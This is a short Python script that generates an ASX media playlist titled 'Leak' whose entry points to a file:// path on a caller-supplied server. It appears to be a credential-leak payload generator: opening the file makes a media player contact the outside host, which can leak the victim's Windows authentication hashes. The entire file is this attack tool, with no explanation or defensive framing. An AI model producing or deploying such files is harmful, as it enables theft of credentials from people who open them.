#!/usr/bin/env python
# -*- coding: utf-8 -*-


def create_asx(generate, server, filename):
    file = open(filename, "w")
    file.write(
        """<asx version="3.0">
   <title>Leak</title>
   <entry>
      <title></title>
      <ref href="file://"""
        + server
        + """/leak/leak.wma"/>
   </entry>
</asx>"""
    )
    file.close()
    print("Created: " + filename + " (OPEN)")
